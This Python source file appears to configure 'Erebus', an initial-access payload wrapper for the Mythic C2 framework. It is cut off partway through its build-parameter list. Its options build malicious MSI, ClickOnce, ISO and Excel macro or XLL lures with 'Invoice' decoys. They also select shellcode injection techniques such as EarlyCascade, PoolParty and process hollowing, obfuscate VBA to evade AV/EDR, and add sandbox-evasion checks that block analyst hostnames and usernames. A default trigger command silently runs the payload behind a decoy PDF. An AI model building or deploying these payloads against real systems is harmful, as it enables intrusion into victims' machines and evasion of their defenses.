'''
- Author(s): Lavender-exe // hunterino-sec // Whispergate
- Title: Erebus // erebus_wrapper
- Description: Initial Access Wrapper
'''

from erebus_wrapper.erebus.modules.plugin_loader import get_plugin_loader
from erebus_wrapper.erebus.modules import run_plugin_validation, report_validation_results

_plugin_loader = get_plugin_loader()

_PLUGIN_FUNCTIONS = [
    "generate_proxies",
    "build_clickonce",
    "build_msi",
    "hijack_msi",
    "add_multiple_files_to_msi",
    "create_custom_action",
    "create_payload_trigger",
    "create_bat_payload_trigger",
    "create_msi_payload_trigger",
    "create_clickonce_trigger",
    "build_7z",
    "build_zip",
    "build_iso",
    "self_sign_payload",
    "get_remote_cert_details",
    "sign_with_provided_cert",
    "generate_excel_payload",
    "backdoor_existing_excel",
    "generate_xll_template",
    "register_xll_function",
    "create_msc_explorer_trigger",
]

for _func_name in _PLUGIN_FUNCTIONS:
    globals()[_func_name] = _plugin_loader.get_function(_func_name)

from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
from pathlib import PurePath
from distutils.dir_util import copy_tree
from jinja2 import Environment, FileSystemLoader
from datetime import datetime
from pathlib import Path
import os
import tempfile
import shutil
import hashlib
import asyncio
import subprocess
import zipfile

ENCRYPTION_METHODS = {
    # "AES128_CBC" :  "aes_128",
    # "AES256_CBC" :  "aes_cbc",
    # "AES256_ECB" :  "aes_ecb",
    # "CHACHA20"   :  "chacha20",
    "RC4"        :  "rc4",
    "XOR"        :  "xor",
}

COMPRESSION_METHODS = {
    "LZNT1": "lznt",
    "RLE"  : "rle",
    "NONE" : ""
}

ENCODING_METHODS = {
    "ALPHA32" : "alpha",
    "ASCII85" : "ascii85",
    "BASE64"  : "base64",
    "WORDS256": "words",
    "NONE"    : ""
}

# Compression type mappings for config templates
COMPRESSION_TYPE_MAP = {
    "NONE" : 0,
    "LZNT1": 1,
    "RLE"  : 2,
}

# Encoding type mappings for config templates
ENCODING_TYPE_MAP = {
    "NONE"   : 0,
    "BASE64" : 1,
    "ASCII85": 2,
    "ALPHA32": 3,
    "WORDS256": 4,
}

#
# Commented out to reduce confusion
# uncomment the ones that you will use on your custom loader
#
SHELLCODE_FORMAT = {
    "C"          : "c",
    "CSharp"     : "csharp",
    "Raw"        : "raw",
}

FINAL_PAYLOAD_EXTENSIONS = [
    "7z",
    "zip",
    "tar",
    "tar.gz",
    "iso",
    "msi"
]



class ErebusWrapper(PayloadType):
    name = "erebus_wrapper"
    author = "@Lavender-exe, @hunterino-sec"
    semver = "v0.0.2"
    
    note = f"An Initial Access Toolkit built to speed up payload development & delivery.\nVersion: {semver}"

    file_extension = "zip"
    supported_os = [
        SupportedOS.Windows
    ]

    wrapper = True
    wrapped_payloads = ["merlin", "kharon", "ceos"
                        "sliver", "apollo", "athena",
                        "xenon", "nimplant", "hannibal"]
    c2_profiles = []

    # Plugin validation flag - run only once at startup
    _validation_run = False

    agent_type = AgentType.Wrapper
    agent_path = PurePath(".") / "erebus_wrapper"
    _agent_icon_path = Path(__file__).resolve().parent.parent / "Erebus.png"
    agent_icon_path = str(_agent_icon_path)
    agent_code_path = Path(__file__).resolve().parent.parent / "agent_code"

    build_parameters = [
        BuildParameter(
            name = "0.0 Main Payload Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Select the main payload type (Shellcode Loader or DLL Hijack)
NOTE: Loaders are written in C++ - Supplied shellcode format must be raw for `Loader` and C for `Hijack`.
""",
            choices = ["Loader", "Hijack"],
            default_value="Loader",
        ),

        BuildParameter(
            name = "0.0a Enable Custom Shellcode",
            parameter_type = BuildParameterType.Boolean,
            description = (
                "Upload custom raw shellcode from an external C2 (e.g. Cobalt Strike, Havoc, Sliver). "
                "When enabled the Mythic-wrapped payload is ignored and the uploaded file is used as "
                "the shellcode source. The file must be raw position-independent shellcode - "
                "PE files (MZ header) are rejected."
            ),
            default_value = False,
            required = False,
        ),

        BuildParameter(
            name = "0.0b Custom Shellcode File",
            parameter_type = BuildParameterType.File,
            description = (
                "Raw shellcode blob to use instead of the Mythic-wrapped payload "
                "(e.g. a .bin produced by msfvenom, CS payload generator, etc.). "
                "Must be raw shellcode - PE files will be rejected."
            ),
            required = False,
            hide_conditions = [
                HideCondition(name="0.0a Enable Custom Shellcode", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.1 Loader Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the type of loader to use",
            choices = ["ClickOnce", "Shellcode Loader"],
            default_value = "Shellcode Loader",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
            ]
        ),

        BuildParameter(
            name = "0.2 Loader Format",
            parameter_type = BuildParameterType.ChooseOne,
            description = (
                "Select the loader's output format. "
                "exe = standard PE executable. "
                "dll = DLL (side-loadable, regsvr32). "
                "cpl = Control Panel applet (loaded via control.exe or double-click). "
                "xll = Excel Add-In DLL (xlAutoOpen trigger)"
            ),
            choices = ["exe", "dll", "cpl", "xll"],
            default_value = "exe",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
            ]
        ),

        BuildParameter(
            name = "0.2a Loader Architecture",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the target architecture for the loader",
            choices = ["x64", "x86"],
            default_value = "x64",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
            ]
        ),

        BuildParameter(
            name = "0.3 Loader Build Configuration",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the loader's build config.",
            choices = ["debug", "release", "test"],
            default_value = "debug",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="Shellcode Loader"),
            ]
        ),

        BuildParameter(
            name = "0.3 ClickOnce Build Configuration",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the loader's build config.",
            choices = ["debug", "release"],
            default_value = "debug",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
            ]
        ),

        BuildParameter(
            name = "0.3a ClickOnce Architecture",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the target architecture for the ClickOnce loader",
            choices = ["x64", "x86"],
            default_value = "x64",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
            ]
        ),

        # Shellcode Loader Injection Configuration
        BuildParameter(
            name = "0.4 Shellcode Loader - Injection Type",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Select the injection technique for the Shellcode Loader:
1 = NtQueueApcThread (Remote)
2 = NtMapViewOfSection (Remote)
3 = CreateFiber (Self)
4 = EarlyCascade (Remote)
5 = PoolParty (Remote)""",
            choices = ["1", "2", "3", "4", "5"],
            default_value = "1",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
            ]
        ),

        BuildParameter(
            name = "0.5 Shellcode Loader - Target Process",
            parameter_type = BuildParameterType.String,
            description = "Target process for remote injection",
            default_value = "C:\\Windows\\System32\\notepad.exe",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.4 Shellcode Loader - Injection Type", operand=HideConditionOperand.EQ, value="3"),
            ]
        ),

        # Guardrails Configuration
        BuildParameter(
            name = "0.5a Enable Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable guardrails (environment and anti-debugging checks) for the loader",
            default_value = False,
        ),

        BuildParameter(
            name = "0.5b Check IsDebuggerPresent",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for IsDebuggerPresent and PEB.BeingDebugged flag",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5c Check Remote Debugger",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for remote debugger via NtQueryInformationProcess",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5d Check Debugger Processes",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for known debugger and analysis tool processes",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5e Check Hardware Breakpoints",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for hardware breakpoints in debug registers",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5f Check Timing Anomalies",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable timing-based debugger detection (RDTSC and Sleep checks)",
            default_value = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5g Hostname Whitelist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of allowed hostnames (e.g., TARGET-PC,VICTIM-WORKSTATION). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5h Block Analysis Hostnames",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of blocked hostnames (e.g., SANDBOX,MALWARE-ANALYSIS,VM-WIN10)",
            default_value = "SANDBOX,MALWARE-ANALYSIS,VM-WIN10,ANALYST-PC",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5i Block Analysis Usernames",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of blocked usernames (e.g., analyst,malware,sandbox,user,admin)",
            default_value = "analyst,malware,sandbox,user,admin",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5j IP Whitelist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated IP prefixes to allow (e.g., 10.,192.168.50.). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5k IP Blacklist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated IP prefixes to block (e.g., 192.168.122.,172.16.,127.)",
            default_value = "192.168.122.,172.16.,127.",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "0.5l Domain Whitelist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of allowed domains (e.g., CORP.CONTOSO.COM,TARGET-DOMAIN.LOCAL). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.5a Enable Guardrails", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        # ClickOnce Loader Injection Configuration
        BuildParameter(
            name = "0.6 ClickOnce - Injection Method",
            parameter_type = BuildParameterType.ChooseOne,
            description = """Select the injection method for ClickOnce:
earlycascade (remote)
poolparty (remote)
classic (remote)
createfiber (self)
enumdesktops (self)
appdomain (self)""",
            choices = ["createfiber", "earlycascade", "poolparty", "classic", "enumdesktops", "appdomain"],
            default_value = "createfiber",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
            ]
        ),

        BuildParameter(
            name = "0.7 ClickOnce - Target Process",
            parameter_type = BuildParameterType.String,
            description = "Target process for remote injection methods (leave empty for explorer.exe)",
            default_value = "explorer.exe",
            hide_conditions = [
                HideCondition(name="0.1 Loader Type", operand=HideConditionOperand.NotEQ, value="ClickOnce"),
                HideCondition(name="0.6 ClickOnce - Injection Method", operand=HideConditionOperand.EQ, value="createfiber"),
                HideCondition(name="0.6 ClickOnce - Injection Method", operand=HideConditionOperand.EQ, value="enumdesktops"),
            ]
        ),

        BuildParameter(
            name="0.8 Output Extension Source",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose source for the payload ignition and visible extension inside the container (Trigger or MalDoc)",
            choices=["Trigger", "MalDoc"],
            default_value="Trigger",
        ),

        BuildParameter(
            name="0.9 Trigger Type",
            parameter_type=BuildParameterType.ChooseOne,
            description=f"Type of Trigger to toggle decoy and execution. LNK Unavailabe in {semver}",
            choices=["LNK", "BAT", "MSI", "ClickOnce", "MSC"],
            default_value="BAT",
            required=False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
            ]
        ),

        BuildParameter(
            name = "0.9a Trigger Binary",
            parameter_type = BuildParameterType.String,
            description = "Choose a command to run when the trigger is executed.",
            default_value = "C:\\Windows\\System32\\conhost.exe",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSC"),
            ]
        ),

        BuildParameter(
            name = "0.9b Trigger Command",
            parameter_type = BuildParameterType.String,
            description = "Choose a command to run when the trigger is executed.",
            default_value = "--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="Trigger"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSI"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="ClickOnce"),
                HideCondition(name="0.9 Trigger Type", operand=HideConditionOperand.EQ, value="MSC"),
            ]
        ),

  # MalDocs - Excel Backdooring
        BuildParameter(
            name="0.9 Create MalDoc",
            parameter_type=BuildParameterType.ChooseOne,
            description="Create/backdoor Excel documents, export VBA module only, or disable MalDoc generation",
            choices=["None", "Create/Backdoor Excel", "VBA Module Only"],
            default_value="None",
            required=False,
            hide_conditions=[
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9a MalDoc Type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Create new Excel document or backdoor an existing one",
            choices=["Create New", "Backdoor Existing"],
            default_value="Create New",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9b Excel Source File",
            parameter_type=BuildParameterType.File,
            description="Upload an existing Excel file to backdoor (XLSM/XLS/XLAM)",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9a MalDoc Type", operand=HideConditionOperand.NotEQ, value="Backdoor Existing"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9c VBA Execution Trigger",
            parameter_type=BuildParameterType.ChooseOne,
            description="VBA macro execution trigger method",
            choices=["AutoOpen", "OnClose", "OnSave"],
            default_value="AutoOpen",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
            ]
        ),

        BuildParameter(
            name="0.9d Excel Document Name",
            parameter_type=BuildParameterType.String,
            description="Name/title for the Excel document",
            default_value="Invoice",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9e Obfuscate VBA",
            parameter_type=BuildParameterType.Boolean,
            description="Obfuscate VBA code to evade AV/EDR detection",
            default_value=True,
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9f MalDoc Injection Type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Type of payload injection - Command executes trigger binary, Shellcode injects VBA-formatted shellcode",
            choices=["Command Execution", "Shellcode Injection"],
            default_value="Command Execution",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9f1 MalDoc Trigger Binary",
            parameter_type=BuildParameterType.String,
            description="Executable to run when the VBA trigger fires (Command Execution mode only).",
            default_value="C:\\Windows\\System32\\conhost.exe",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.NotEQ, value="Command Execution"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9f2 MalDoc Trigger Command",
            parameter_type=BuildParameterType.String,
            description="Arguments passed to the trigger binary (Command Execution mode only).",
            default_value="--headless cmd.exe /Q /c erebus.exe | decoy.pdf",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.NotEQ, value="Command Execution"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9g VBA Loader Technique",
            parameter_type=BuildParameterType.ChooseOne,
            description="VBA shellcode loader technique - VirtualAlloc (classic), EnumLocales (callback), QueueUserAPC (APC), ProcessHollowing (remote)",
            choices=["VirtualAlloc + CreateThread", "EnumSystemLocalesA Callback", "QueueUserAPC Injection", "Process Hollowing"],
            default_value="VirtualAlloc + CreateThread",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.EQ, value="Command Execution"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.NotEQ, value="VBA Macro")
            ]
        ),

        # XLL (Excel Add-In DLL) Parameters
        BuildParameter(
            name="0.9h XLL Payload Type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Generate XLL (Excel Add-In DLL) instead of VBA macro - native DLL executed when Excel loads",
            choices=["VBA Macro", "XLL Add-In DLL"],
            default_value="VBA Macro",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9f MalDoc Injection Type", operand=HideConditionOperand.EQ, value="Command Execution"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9i XLL Injection Method",
            parameter_type=BuildParameterType.ChooseOne,
            description="Shellcode injection technique for XLL DLL - CreateThread (self), ProcessInject (remote)",
            choices=["CreateThread (In-Process)", "ProcessInject (Remote)"],
            default_value="CreateThread (In-Process)",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9j XLL Target Process",
            parameter_type=BuildParameterType.String,
            description="Target process for remote injection (e.g., C:\\Windows\\System32\\notepad.exe)",
            default_value="C:\\Windows\\System32\\notepad.exe",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
                HideCondition(name="0.9i XLL Injection Method", operand=HideConditionOperand.EQ, value="CreateThread (In-Process)"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9k XLL Compiler",
            parameter_type=BuildParameterType.ChooseOne,
            description="Windows compiler to use for XLL DLL compilation (requires Windows build system)",
            choices=["MSVC", "MinGW"],
            default_value="MSVC",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9l XLL Guardrail Includes",
            parameter_type=BuildParameterType.String,
            description="Optional include block inserted before windows.h (e.g., #include <winsock2.h>)",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9m XLL Guardrail Code",
            parameter_type=BuildParameterType.String,
            description="Optional guardrail C/C++ code. Must define BOOL ErebusGuardrail(void) and return TRUE to execute.",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9n XLL Guardrail Extra Libs",
            parameter_type=BuildParameterType.String,
            description="Optional extra linker flags for XLL builds (e.g., -lws2_32)",
            default_value="",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9o XLL Decoy XLSX",
            parameter_type=BuildParameterType.File,
            description="Optional custom XLSX used for XLL decoy arrays (XLSX/ZIP). Defaults to template.xlsx if not supplied.",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.EQ, value="VBA Macro"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc")
            ]
        ),

        BuildParameter(
            name="0.9p MalDoc Output Format",
            parameter_type=BuildParameterType.ChooseOne,
            description=(
                "Output format for the VBA maldoc. "
                "All formats require erebus_helper on a Windows host (deferred via build_maldoc.bat). "
                "xlsm: macro-enabled workbook. xlsx: workbook saved as xlsm. xlam: Excel add-in."
            ),
            choices=["xlsm", "xlsx", "xlam"],
            default_value="xlsm",
            required=False,
            hide_conditions=[
                HideCondition(name="0.9 Create MalDoc", operand=HideConditionOperand.EQ, value="None"),
                HideCondition(name="0.9h XLL Payload Type", operand=HideConditionOperand.NotEQ, value="VBA Macro"),
                HideCondition(name="0.8 Output Extension Source", operand=HideConditionOperand.NotEQ, value="MalDoc"),
            ]
        ),

        BuildParameter(
            name = "0.13 Decoy File Inclusion",
            parameter_type = BuildParameterType.Boolean,
            description = "Check whether you want the decoy file in the final payload or not",
            default_value = False,
            required=True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Loader"),
            ]
        ),

        BuildParameter(
            name = "0.13 Decoy File",
            parameter_type = BuildParameterType.File,
            description = """Upload a decoy file (PDF/XLSX/etc.).
If one is not uploaded then an example file will be used.""",
            hide_conditions = [
                HideCondition(name="0.13 Decoy File Inclusion", operand=HideConditionOperand.EQ, value=False),
            ]
        ),

        BuildParameter(
            name = "1.0 DLL Hijacking",
            parameter_type = BuildParameterType.File,
            description = f"""Prepares a given DLL for proxy-based hijacking.
NOTE: ({semver}) Only supports XOR for now. Does not (currently) support encoded or compressed payloads.
""",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
            ]
        ),

        BuildParameter(
            name = "1.0a Hijack Loader Architecture",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the target architecture for the DLL loader",
            choices = ["x64", "x86"],
            default_value = "x64",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
            ]
        ),

        BuildParameter(
            name = "1.0b Hijack Build Configuration",
            parameter_type = BuildParameterType.ChooseOne,
            description = "Select the build configuration for the DLL hijack payload",
            choices = ["release", "debug"],
            default_value = "release",
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
            ]
        ),

        # DLL Hijack Built-in Guardrails
        BuildParameter(
            name = "1.1 Use Built-in Guardrails",
            parameter_type = BuildParameterType.Boolean,
            description = "Use built-in anti-debugging and environment checks instead of custom code",
            default_value = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
            ]
        ),

        BuildParameter(
            name = "1.1a Check IsDebuggerPresent",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for IsDebuggerPresent and PEB.BeingDebugged flag",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1b Check Remote Debugger",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for remote debugger via NtQueryInformationProcess",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1c Check Debugger Processes",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for known debugger and analysis tool processes",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1d Check Hardware Breakpoints",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable check for hardware breakpoints in debug registers",
            default_value = True,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1e Check Timing Anomalies",
            parameter_type = BuildParameterType.Boolean,
            description = "Enable timing-based debugger detection (RDTSC and Sleep checks)",
            default_value = False,
            hide_conditions = [
                HideCondition(name="0.0 Main Payload Type", operand=HideConditionOperand.NotEQ, value="Hijack"),
                HideCondition(name="1.1 Use Built-in Guardrails", operand=HideConditionOperand.EQ, value="false"),
            ]
        ),

        BuildParameter(
            name = "1.1f Hostname Whitelist",
            parameter_type = BuildParameterType.String,
            description = "Comma-separated list of allowed hostnames (e.g., TARGET-PC,VICTIM-WORKSTATION). Leave empty to disable.",
            default_value = "",
            hide_conditions = [
